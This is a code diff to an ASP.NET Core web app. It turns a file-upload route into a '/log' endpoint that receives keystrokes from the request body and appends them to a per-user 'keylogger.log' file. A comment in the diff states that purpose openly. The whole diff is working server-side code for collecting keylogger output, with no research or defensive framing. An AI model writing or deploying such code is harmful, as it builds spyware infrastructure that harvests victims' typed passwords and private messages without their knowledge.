@@ -21,18 +21,21 @@ app.UseSwaggerUI();
 
 app.UseRouting();
 
-// Update this route to receive the file correctly
-app.MapPost("/upload", async (HttpRequest request) =>
+// Update this route to receive the keystrokes correctly
+app.MapPost("/log", async (HttpRequest request) =>
 {
-    if (!request.HasFormContentType || request.Form.Files.Count == 0)
-    {
-        return Results.BadRequest("No file uploaded.");
-    }
-
-    var username = request.Form["username"].ToString();
+    var username = request.Query["username"].ToString();
     if (string.IsNullOrWhiteSpace(username))
     {
         return Results.BadRequest("Username is required.");
+    }
+
+    using var reader = new StreamReader(request.Body);
+    var content = await reader.ReadToEndAsync();
+
+    if (string.IsNullOrEmpty(content))
+    {
+        return Results.BadRequest("No content.");
     }
 
     // Sanitize username to prevent directory traversal
@@ -42,16 +45,12 @@ app.MapPost("/upload", async (HttpRequest request) =>
     var userUploadPath = Path.Combine(baseUploadPath, safeUsername);
     Directory.CreateDirectory(userUploadPath);
  
-    var file = request.Form.Files[0]; // Get the first uploaded file
-    var filePath = Path.Combine(userUploadPath, file.FileName);
+    var filePath = Path.Combine(userUploadPath, "keylogger.log");
 
-    // Save the file
-    using (var stream = new FileStream(filePath, FileMode.Create))
-    {
-        await file.CopyToAsync(stream);
-    }
+    // Append the keystrokes to the file
+    await File.AppendAllTextAsync(filePath, content);
 
-    return Results.Ok(new { filePath });
+    return Results.Ok();
 });
 
 app.Run();
